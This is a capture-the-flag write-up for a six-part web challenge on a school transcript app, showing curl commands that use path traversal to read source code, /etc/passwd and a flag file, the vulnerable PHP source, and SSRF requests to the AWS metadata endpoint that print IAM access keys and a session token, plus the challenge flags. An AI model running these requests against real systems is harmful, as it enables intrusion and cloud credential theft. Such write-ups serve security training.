# GovTech SecTech
GovTech

## Challenge 

DESCRIPTION
GovTech Sponsor Challenge

Login with the username temp_acc and password temp_pass

### 1/6

WhiteHacks SecTech is an application for SecTech school staff to login to the system and to view students grades and to generate transcripts. However, could you perhaps view more than transcripts?

### 2/6 

Insecure Direct Object Reference can have severe repercussions for applications. One mitigation technique is to avoid trusting user input. If you are tired, have some cookies with milk?

### 3/6 

Trusting serialized data without verification them can be precarious. To this end, we ask that you be like the Cookie Monster, attentive and inquisitive.

### 4/6

Cross site scripting can come in many forms. In the worst case scenario, it may even allow admin credentials to be stolen. We understand the generation of transcript to be a privileged process in WhiteHacks SecTech. Is it truly secure? Try to print out some cookies!

### 5/6

Server Side Request Forgery allows one to make HTTP requests on behalf of the server. Some animals are more equal than the others, just like we think SecTech is more equal to AWS than a normal plebian would be.

### 6/6

We love how the system archives past student records - after all, data is gold. If you don't find the gold, we suggest you dig deeper and look beyond the surface, specifically the 'root' :)


## Solution

### Solve 1/6, 2/6, 3/6, 4/6 using Path traversal attack

For example, transcript.php

	$ curl 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript.php'

Try transcript_write.php

	$ curl 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript_write.php'
	<?php
	require("vendor/autoload.php");

	if ($_GET['user'] == "temp_acc" && $_GET['password'] == "temp_pass") {
		ob_start(); 
		$user=DB::queryFirstRow("SELECT user_id,name,nric from grades WHERE user_id = %i", $_GET['user_id']);
		$grades=DB::query("SELECT course_code, course_name, course_grade from grades WHERE user_id = %i", $_GET['user_id']);
		$grades_html="";
		
		foreach ($grades as $grade) {
			$grades_html .= "<tr><td>" .$grade['course_code']."</td><td>" .$grade['course_name']."</td><td>" .$grade['course_grade']."</td></tr>";
		}
		$content=file_get_contents(basename($_GET['file'])); 
		$content=str_replace("<tr><td>IS200</td><td>Software Foundations</td><td>A+</td></tr><tr><td>IS103</td><td>Computational Thinking</td><td>A+</td></tr><tr><td>IS101</td><td>Seminar on Information Systems</td><td>A+</td></tr><tr><td>WRIT001</td><td>ACADEMIC WRITING</td><td>B+</td></tr>",$grades_html,$content);
		$content=str_replace("Bob Tan",$user['name'],$content);
		$content=str_replace("S1234567E",$user['nric'],$content);
		$content=str_replace("02nd August 2020, 07:22:01AM",date("dS F Y, H:i:sA"), $content);
		$content.= '<script type="text/javascript" src="'.$_GET['script'].'"></script>';
		$content.= "</body></html>";
		//Temporary HTML file
		$temp = tmpfile();
		$metaDatas = stream_get_meta_data($temp);
		$tempFilename = $metaDatas['uri'];

		//Temporary PDF file
		$tempPDF = tmpfile();
		$metaDatas = stream_get_meta_data($tempPDF);
		$tempPDFFilename = $metaDatas['uri'];


		fwrite($temp, $content);
		fseek($temp, 0);
		
		//Thinking to introduce system shell here actually
		system("echo '" .fread($temp, strlen($content)). "' | /usr/bin/xvfb-run /usr/bin/wkhtmltopdf --cookie 'PHPSESSID' 'WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}' - ". $tempPDFFilename);
		ob_end_clean();
		echo fread($temp, 1024);
		fclose($temp);

		/*$fp=fopen("transcript-write.html", "w");
		fwrite($fp,$content);
		fclose($fp);*/
		
		header("Content-type:application/pdf");
		header('Content-Disposition: attachment; filename=transcript.pdf');
		readfile($tempPDFFilename);
	}

We found the flag...

	WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}

Oh hmm, this is the flag for the 4/6 challenge

---

Try again admin.php


	$ curl 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=admin.php'
	<?php include 'header.php'; ?>

	<div class="section no-pad-bot" id="index-banner">
	<div class="container">
	<br><br>
	<h1 class="header center gold-text">Restriction</h1>
	<div class="row center">
	<h5 class="header col s12 light">
	<?php
	$user_cookie = unserialize(base64_decode($_COOKIE["sectech"]));
	if ($user_cookie["admin"]) {
	echo "Good job! Always validate input from external sources and never take it for granted. <br><br>Flag: WH2020{Cook!3Ins3cur3Des3r!al!zat!on_Adm!nR!ghts}";
	} else {

Wow lame, this is the flag for the 3/6 challenge.

---

Try profile.php

	$ curl -s 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=profile.php' | grep WH2020
	<td>WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}</td>

Again, this is for 2/6 challenge. I haven't solved 1/6 yet, how is this possible?!?!?!?

---

Check /etc/passwd, out of curiosity

	$ curl -s 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/etc/passwd'
		root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		sync:x:4:65534:sync:/bin:/bin/sync
		games:x:5:60:games:/usr/games:/usr/sbin/nologin
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
		irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
		gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
		_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
		systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
		systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
		systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
		messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
		avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
		geoclue:x:106:111::/var/lib/geoclue:/usr/sbin/nologin
		admin:x:1000:1000:admin:/home/admin:/secret_path/lfi_flag.txt

Now, I found a flag. Finally, it is 1/6 flag

	$ curl -s 'http://sec-tech.cf/transcript.php?user=temp_acc&password=temp_pass&user_id=1&file=/secret_path/lfi_flag.txt'
	WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}

### Solve 5/6 using SSRF

Go to the ranking page, notice there is this localhost address appended. We see we can do Server Side Request Forgery

- http://sec-tech.cf/rankings.php?ranking-url=http://localhost/university-rankings.html

See the payloads cheatsheet

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-exploitation-via-url-scheme

In the end I used this and got the flag!

- http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/user-data

### Solve 6/6 (Not finished)

Go to past records page

- http://sec-tech.cf/past_records.php

Then we find out the link of the AWS page

- https://sectech-archived-student-records.s3-ap-southeast-1.amazonaws.com/

There is a backup notes

- https://sectech-archived-student-records.s3-ap-southeast-1.amazonaws.com/backup-notes.txt

It says there is a Github Page

- https://github.com/chriswang-sectech/sectech-backup-scripts

And from the github page, we know there is a server

	Login into the instance
	# PLEASE USE YOUR ACCOUNT!
	ssh chrisw@sec-tech.cf -p 8822

???

Try https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#abusing-ssrf-in-aws-ec2-environment

Go to 

- http://sec-tech.cf/rankings.php?ranking-url=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws


We can get the codes

	{ "Code" : "Success", "LastUpdated" : "2020-08-02T07:53:14Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIA6GG7PSQGUUMXEHWA", "SecretAccessKey" : "GYP30J8BtNVAJ3uT6HN4daBS1lz+mbi2tqKUhiTz", "Token" : "IQoJb3JpZ2luX2VjEKj//////////wEaCXVzLXdlc3QtMiJHMEUCIB8J58zLpyuvrwlA2ZXDMirMH9lZxaCNeE25zPfjc1O3AiEArghDmyFOpi+coVN66EtmmTI4ToLtsQiL95ihpxwnK/MqtAMIcRABGgw5NzU0MjYyNjIwMjkiDGsViRyPD35snlGC4CqRAylgfV6gZ34nWrwHKp0oOT4IZQ2XCFmcl5WcC4oRri4dSF95BHgNT8VOgHqtLCCrtYv5UVZIttyjQXUUNvMjUql1+eC3HVMu6S3eQ+bxIDMcdgpbTmXtTtpSVun63d80svwbJUOHQ7dMnZSTU0maozNPXq316kIFeWEFq/GOKJ0P1sH5GXtXCRbS3SIU6MsiVku/17h2Z9mkua6ELwOK7XR7CIP6U7Pdg10I3Qqj1jkF8q9AlwgOJb5KFFIinHRErQFrpvvdqwHRdfsUJtNBJfaQggW6l+TZeP5ssToJIEs2GjsYctykG+K37Zyd5EQLHvpsesF/ZfW3IzS9s22cxqXqH2g5nc0nG+KdVILtMmYz8WDqUKsuFxIM/Cx0t6jOJUGW/eL4+rSOQmTvBNf9NkjKWPSi3yp4QIxGev8rJeTgeA+F1WCKE/vs4RlD9dzhwxrT5DOt7fB0nTiUN7Xmm2z5Z/MpkqE7mS2akdHgXvZKW5bpe6641gc391XCScR1R+y95LA5JyVm0Z/Es6RqtqYBMILimfkFOusBgR5K3LvlSsueMxAtJ5jfdkbNx7ZPxVjY9TgDZuQnzo9FyItePZvqozgaC8IsQQXStC3WVg1YsYqc8PhS3fM9c34y44RbIV1tVXUCPWoz4HEmPLMVzLxSghUD6guQe2CziuQVXcOOhXP5Y5G8IkXhUqHZKCmL5BUEv1e2W0whPZx2c5mQHV0mNIpGAeUguYOPjFM0VflhJKDXIRyTfP/B2gduJ96Dp9VihdtcqUk+MO09f6ClaOU1W7Qqe2pQytGYjIf8aEMubjYHsc7wK9Nfxpj5bq4g37AxugxwmWl6f+6pB+TtEkHzC6wqOw==", "Expiration" : "2020-08-02T14:21:42Z" }

http://sec-tech.cf/rankings.php?ranking-url=http://169.254.169.254/latest/dynamic/instance-identity/document


	{ "accountId" : "119929984587", "architecture" : "x86_64", "availabilityZone" : "ap-southeast-1a", "billingProducts" : null, "devpayProductCodes" : null, "marketplaceProductCodes" : null, "imageId" : "ami-063e3af9d2cc7fe94", "instanceId" : "i-081598ae745f9c1f1", "instanceType" : "t2.2xlarge", "kernelId" : null, "pendingTime" : "2020-08-01T10:38:48Z", "privateIp" : "172.31.45.124", "ramdiskId" : null, "region" : "ap-southeast-1", "version" : "2017-09-30" }



## Flag

	1/6 = WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}
	2/6 = WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
	3/6 = WH2020{Cook!3Ins3cur3Des3r!al!zat!on_Adm!nR!ghts}
	4/6 = WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
	5/6 = WH2020{EC2UserData-SSRF}
	6/6 = ?
